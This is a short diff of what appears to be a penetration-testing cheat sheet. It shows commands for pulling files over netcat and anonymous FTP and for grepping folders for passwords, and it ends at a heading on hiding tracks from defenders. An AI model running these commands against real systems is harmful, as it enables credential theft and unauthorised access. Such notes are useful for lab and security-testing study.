@@ -29,8 +29,8 @@ nc -w 3 192.168.225.131 5555 | tar -zxf -
 wget --recursive --no-parent ftp://anonymous:anonymous@10.10.10.666/Program%20Data/
 wget -m ftp://anonymous:anonymous@10.10.10.666/Program%20Data/
 
-# Grep folders for password
-grep -R -i password .
+# Grep folders for password  (-R recursive -i ignore case -A5 include 5 lines of text after)
+grep -R -i -A5 password .
 
 - + - + - + - + - + - + - + - + - + - + - + - + 
 # Hiding tracks / annoying blue team
